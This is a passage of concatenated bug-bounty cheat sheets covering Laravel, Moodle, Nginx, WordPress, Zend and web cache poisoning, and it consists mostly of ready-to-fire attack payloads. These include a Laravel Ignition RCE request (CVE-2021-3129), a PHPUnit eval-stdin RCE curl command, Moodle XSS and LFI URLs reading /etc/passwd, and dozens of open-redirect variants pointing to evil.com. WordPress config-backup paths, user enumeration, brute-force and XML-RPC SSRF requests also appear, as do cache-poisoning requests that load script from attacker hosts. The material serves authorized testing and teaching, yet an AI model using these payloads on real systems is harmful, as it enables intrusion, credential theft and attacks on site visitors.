Usually in the HTTP response there is a header like this `Set-Cookie: laravel_session=`

1. Find the related CVE by checking laravel version
* How to find the laravel version

By checking the composer file in `https://example.com/composer.json`, sometimes the version is printed there. If you found outdated laravel version, find the CVEs at [CVEDetails](https://www.cvedetails.com/vulnerability-list/vendor_id-16542/product_id-38139/Laravel-Laravel.html)

Some example CVE:

- CVE-2021-3129 (Remote Code Execution)
```
POST /_ignition/execute-solution HTTP/1.1
Host: example.com
Accept: application/json
Content-Type: application/json

{"solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution", "parameters": {"variableName": "cve20213129", "viewFile": "php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"}}
```

2. Laravel 4.8.28 ~ 5.x - PHPUnit Remote Code Execution (CVE-2017-9841)
```
curl -d "<?php echo php_uname(); ?>" http://example.com/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
```

3. Exposed environment variables 
* Full Path Exploit : http://example.com/.env

![Environment Variables](https://1.bp.blogspot.com/-EUTxgP5XE6Q/XkgB4SyWSbI/AAAAAAAAAQA/eqtALOjLKKA46si-lIosm6cDVmxByjzIQCLcBGAsYHQ/s1600/1.png)

4. Exposed log files
* Full Path Exploit : http://example.com/storage/logs/laravel.log

5. Laravel Debug Mode Enabled
* Try to request to https://example.com using POST method (Error 405)
* Using [] in paramater (ex:example.com/param[]=0)

![Laravel Debug Mode](https://hacken.io/wp-content/uploads/2019/07/laravel-screen.png)





### File: Bug-Bounty-Tips/Technologies/Moodle.md

# Moodle Common Bugs

## Introduction
What would you do if you came across a website that uses Moodle?

## How to Detect
If you visit `https://target.com` and see the source code, you will see `<meta name="keywords" content="moodle,`

1. Reflected XSS in /mod/lti/auth.php via "redirect_url" parameter
```
https://target.com/mod/lti/auth.php?redirect_uri=javascript:alert(1)
```

2. Open redirect in /mod/lti/auth.php in "redirect_url" parameter

```
https://target.com/mod/lti/auth.php?redirect_uri=https://evil.com
```

3. LFI /filter/jmol/js/jsmol/php/jsmol.php in "query" parameter

```
https://target.com/filter/jmol/js/jsmol/php/jsmol.php?call=getRawDataFromDatabase&query=file:///etc/passwd
```


### File: Bug-Bounty-Tips/Technologies/Nginx.md

# Nginx Common Bugs

## Introduction
What would you do if you came across a website that uses Nginx?

## How to Detect
Usually in the HTTP response there is a header like this `Server: nginx`

1. Find the related CVE by checking nginx version
* How to find the nginx version

By checking the response header or using 404 page, sometimes the version is printed there. If you found outdated nginx version, find the CVEs at [CVE Details](https://www.cvedetails.com/vulnerability-list/vendor_id-315/product_id-101578/F5-Nginx.html)

2. Directory traversal
```
https://example.com/folder1../folder1/folder2/static/main.css
https://example.com/folder1../%s/folder2/static/main.css
https://example.com/folder1/folder2../folder2/static/main.css
https://example.com/folder1/folder2../%s/static/main.css
https://example.com/folder1/folder2/static../static/main.css
https://example.com/folder1/folder2/static../%s/main.css
```

3. Open redirect
This is because of misconfiguration
```
https://example.com/%5cevil.com
https://example.com////\;@evil.com
https://example.com////evil.com
https://example.com///evil.com
https://example.com///evil.com/%2f%2e%2e
https://example.com///evil.com@//
https://example.com///{{RootURL}}evil.com/%2f%2e%2e
https://example.com//;@evil.com
https://example.com//\/evil.com/
https://example.com//\@evil.com
https://example.com//\evil.com
https://example.com//\tevil.com/
https://example.com//evil.com/%2F..
https://example.com//evil.com//
https://example.com//evil.com@//
https://example.com//evil.com\tevil.com/
https://example.com//https://evil.com@//
https://example.com/<>//evil.com
https://example.com/\/\/evil.com/
https://example.com/\/evil.com
https://example.com/\evil.com
https://example.com/evil.com
https://example.com/evil.com/%2F..
https://example.com/evil.com/
https://example.com/evil.com/..;/css
https://example.com/https:evil.com
```

4. Nginx status page
```
https://example.com/nginx_status
```



### File: Bug-Bounty-Tips/Technologies/WordPress.md

# WordPress Common Bugs

## Introduction
What would you do if you came across a website that uses WordPress?

## How to Detect
If you visit `https://target.com` and see the source code, you will see the links to themes and plugins from WordPress. Or you can visit `https://target.com/wp-login.php`, it is the WordPress login admin page

1. Find the related CVE by checking the core, plugins, and theme version
* How to find the wordpress version
```
https://target.com/feed
https://target.com/?feed=rss2
```

* How to find the plugin version
```
https://target.com/wp-content/plugins/PLUGINNAME/readme.txt
https://target.com/wp-content/plugins/PLUGINNAME/readme.TXT
https://target.com/wp-content/plugins/PLUGINNAME/README.txt
https://target.com/wp-content/plugins/PLUGINNAME/README.TXT
```

> or change readme.txt to changelog.txt or readme.md

* How to find the theme version
```
https://target.com/wp-content/themes/THEMENAME/style.css
https://target.com/wp-content/themes/THEMENAME/readme.txt (If they have readme file)
```
If you found outdated core / plugins / themes, find the exploit at https://wpscan.com

2. Finding log files
```
http://target.com/wp-content/debug.log
```

3. Finding backup file wp-config
```
http://target.com/.wp-config.php.swp
http://target.com/wp-config.inc
http://target.com/wp-config.old
http://target.com/wp-config.txt
http://target.com/wp-config.html
http://target.com/wp-config.php.bak
http://target.com/wp-config.php.dist
http://target.com/wp-config.php.inc
http://target.com/wp-config.php.old
http://target.com/wp-config.php.save
http://target.com/wp-config.php.swp
http://target.com/wp-config.php.txt
http://target.com/wp-config.php.zip
http://target.com/wp-config.php.html
http://target.com/wp-config.php~
```

4. Get the username on the website
```
http://target.com/?author=1
```
or
```
http://target.com/wp-json/wp/v2/users
http://target.com/?rest_route=/wp/v2/users
```

5. Bruteforce
```
POST /wp-login.php HTTP/1.1
Host: target.com

log=admin&pwd=BRUTEFORCE_IN_HERE&wp-submit=Log+In&redirect_to=http%3A%2F%2Ftarget.com%2Fwp-admin%2F&testcookie=1
```
or
```
POST /xmlrpc.php HTTP/1.1
Host: target.com

<?xml version="1.0" encoding="UTF-8"?>
<methodCall> 
<methodName>wp.getUsersBlogs</methodName> 
<params> 
<param><value>admin</value></param> 
<param><value>BRUTEFORCE_IN_HERE</value></param> 
</params> 
</methodCall>
```

6. XSPA in wordpress
```
POST /xmlrpc.php HTTP/1.1
Host: target.com

<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://yourip:port</string></value>
</param><param>
<value>
<string>https://target.com></string>
</value>
</param></params>
</methodCall>
```

7. Register enabled
```
http://example.com/wp-login.php?action=register
```


### File: Bug-Bounty-Tips/Technologies/Zend.md

# Zend Common Bugs

## Introduction
What would you do if you came across a website that uses Zend?

## How to Detect
`-`

1. Finding config files
```
https://target.com/application/configs/application.ini
https://target.com/admin/configs/application.ini
```


### File: Bug-Bounty-Tips/Web Cache Poisoning.md

# Web Cache Poisoning

## Introduction
The objective of web cache poisoning is to send a request that causes a harmful response that gets saved in the cache and served to other users.

## Where to find
`-`

## How to exploit
1. Basic poisoning
```
GET / HTTP/1.1
Host: www.vuln.com
X-Forwarded-Host: evil.com
```
The response is
```
HTTP/1.1 200 OK
Cache-Control: public, no-cache
…
<img href="https://evil.com/a.png" />
```
> Or you can input XSS payloads
```
GET / HTTP/1.1
Host: www.vuln.com
X-Forwarded-Host: a.\"><script>alert(1)</script>
```
The response is
```
HTTP/1.1 200 OK
Cache-Control: public, no-cache
…
<img href="https://a.\"><script>alert(1)</script>a.png" />
```

2. Seizing the Cache
```
GET / HTTP/1.1
Host: unity3d.com
X-Host: evil.com
```
The response is
```
HTTP/1.1 200 OK
Via: 1.1 varnish-v4
Age: 174
Cache-Control: public, max-age=1800
…
<script src="https://evil.com/x.js">
</script>
```

3. Selective poisoning
```
GET / HTTP/1.1
Host: redacted.com
User-Agent: Mozilla/5.0 (<snip> Firefox/60.0)
X-Forwarded-Host: a"><iframe onload=alert(1)>
```
The response is
```
HTTP/1.1 200 OK
X-Served-By: cache-lhr6335-LHR
Vary: User-Agent, Accept-Encoding
…
<link rel="canonical" href="https://a">a<iframe onload=alert(1)>
```

4. Chaining Unkeyed Inputs 
- First step
```
GET /en HTTP/1.1
Host: redacted.net
X-Forwarded-Host: xyz
```
The response is
```
HTTP/1.1 200 OK
Set-Cookie: locale=en; domain=xyz
```
- Second step
```
GET /en HTTP/1.1
Host: redacted.net
X-Forwarded-Scheme: nothttps
```
The response is
```
HTTP/1.1 301 Moved Permanently
Location: https://redacted.net
```
- Third step
```
GET /en HTTP/1.1
Host: redacted.net
X-Forwarded-Host: attacker.com
X-Forwarded-Scheme: nothttps
```
The response is
```
HTTP/1.1 301 Moved Permanently
Location: https://attacker.com/en
```

5. Route Poisoning
```
GET / HTTP/1.1
Host: www.goodhire.com
X-Forwarded-Server: evil
```
The response is
```
HTTP/1.1 404 Not Found
CF-Cache-Status: MISS
...
<title>HubSpot - Page not found</title>
<p>The domain canary does not exist in our system.</p>
```
To exploit this, we need to go to hubspot.com, register ourselves as a HubSpot client, place a payload on our HubSpot page, and then finally trick HubSpot into serving this response on goodhire.com
```
GET / HTTP/1.1
Host: www.goodhire.com
X-Forwarded-Host: portswigger-labs-4223616.hs-sites.com
```
The response is
```
HTTP/1.1 200 OK
…
<script>alert(document.domain)</script>
```

6. Hidden Route Poisoning
```
GET / HTTP/1.1
Host: blog.cloudflare.com
X-Forwarded-Host: evil
```
The response is
```
HTTP/1.1 302 Found
Location: https://ghost.org/fail/
```
When a user first registers a blog with Ghost, it issues them with a unique subdomain under ghost.io. Once a blog is up and running, the user can define an arbitrary custom domain like blog.cloudflare.com. If a user has defined a custom domain, their ghost.io subdomain will simply redirect to it:
```
GET / HTTP/1.1
Host: blog.cloudflare.com
X-Forwarded-Host: noshandnibble.ghost.io
```
The response is
```
HTTP/1.1 302 Found
Location: http://noshandnibble.blog/
```

## References
* [Portswigger](https://portswigger.net/research/practical-web-cache-poisoning)
